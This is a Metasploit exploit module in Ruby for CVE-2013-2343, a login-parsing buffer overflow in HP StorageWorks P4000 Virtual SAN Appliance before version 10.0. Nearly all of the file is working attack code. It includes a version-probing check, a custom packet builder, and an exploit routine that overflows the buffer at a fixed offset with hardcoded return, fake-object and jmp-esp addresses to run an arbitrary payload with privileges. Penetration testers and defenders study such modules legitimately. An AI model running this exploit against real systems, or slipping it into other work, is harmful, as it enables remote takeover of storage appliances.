# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "HP StorageWorks P4000 Virtual SAN Appliance Login Buffer Overflow",
      &#039;Description&#039;    => %q{
        This module exploits a buffer overflow vulnerability found in HP&#039;s StorageWorks
        P4000 VSA on versions prior to 10.0. The vulnerability is due to an insecure usage
        of the sscanf() function when parsing login requests. This module has been tested
        successfully on the HP VSA 9 Virtual Appliance.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;e6af8de8b1d4b2b6d5ba2610cbf9cd38&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-2343&#039;],
          [&#039;OSVDB&#039;, &#039;94701&#039;],
          [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-179/&#039;],
          [&#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03661318&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;       => "\x2f\x00\x0d\x0a",
          &#039;Space&#039;          => 780,
          &#039;DisableNops&#039;    => true,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [ &#039;HP VSA 9&#039;,
            {
              &#039;Version&#039;    => &#039;9.0.0&#039;,
              &#039;Offset&#039;     => 3446,
              &#039;Ret&#039;        => 0x0804EB34, # pop ebp # ret # from hydra
              &#039;FakeObject&#039; => 0x08072E58, # from hydra data
              &#039;JmpEsp&#039;     => 0x08050CB8  # push esp # ret # from hydra
            }
          ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Jun 28 2013",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptPort.new(&#039;RPORT&#039;, [true, &#039;The remote port&#039;, 13838])
      ], self.class)
  end

  def check
    connect
    packet = generate_packet("login:/global$agent/L0CAlu53R/Version \"#{target[&#039;Version&#039;]}\"")
    print_status("#{rhost}:#{rport} Sending login packet to check...")
    sock.put(packet)
    res = sock.get_once
    disconnect

    if res and res=~ /OK/ and res =~ /Login/
      return Exploit::CheckCode::Vulnerable
    elsif res and res =~ /FAILED/ and res =~ /version/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def generate_packet(data)
    pkt = "\x00\x00\x00\x00\x00\x00\x00\x01"
    pkt << [data.length + 1].pack("N*")
    pkt << "\x00\x00\x00\x00"
    pkt << "\x00\x00\x00\x00\x00\x00\x00\x00"
    pkt << "\x00\x00\x00\x14\xff\xff\xff\xff"
    pkt << data
    pkt << "\x00"

    pkt
  end

  def exploit
    connect
    print_status("#{rhost}:#{rport} Sending login packet")
    my_bof = rand_text(target[&#039;Offset&#039;])
    my_bof << [target.ret].pack("V")
    my_bof << [target[&#039;FakeObject&#039;]].pack("V") # Pointer to Fake Object in order to survive LHNSessionManager::SendMessage before ret
    my_bof << [target[&#039;JmpEsp&#039;]].pack("V")
    my_bof << payload.encoded

    packet = generate_packet("login:/#global$agent/#{my_bof}/#{rand_text_alpha(5)}/Version \"1\" ") # Fake version in order to ret asap
    sock.put(packet)
    disconnect
  end

end

